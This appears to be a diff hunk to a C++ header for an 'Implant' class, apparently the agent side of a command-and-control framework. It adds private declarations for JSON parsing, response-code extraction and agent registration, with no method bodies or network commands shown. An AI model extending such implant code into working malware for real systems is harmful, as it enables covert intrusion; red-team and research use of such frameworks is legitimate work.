@@ -34,6 +34,10 @@ private:
     HttpMethod method = HttpMethod::GET,
 	const nlohmann::json& payload = {});
 
+    std::string extractJsonFromString(const std::string& str);
+    int extractResponseCode(const std::string& response);
+    void registerAgent();
+
 public:
     Implant(std::string server_host, std::string server_port, std::string agent_id, bool isRunning = false);
     ~Implant();
